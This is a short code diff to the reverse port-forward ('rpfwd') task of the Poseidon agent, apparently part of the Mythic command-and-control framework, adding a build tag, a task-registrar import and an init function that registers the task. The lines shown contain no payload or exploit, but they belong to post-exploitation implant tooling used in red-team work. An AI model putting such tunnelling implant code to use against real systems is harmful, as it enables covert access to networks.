@@ -1,3 +1,5 @@
+//go:build (linux || darwin) && (rpfwd || debug)
+
 package rpfwd
 
 import (
@@ -12,9 +14,14 @@ import (
 	"time"
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("rpfwd", Run)
+}
 
 type rpfwdTracker struct {
 	Channel    chan structs.SocksMsg
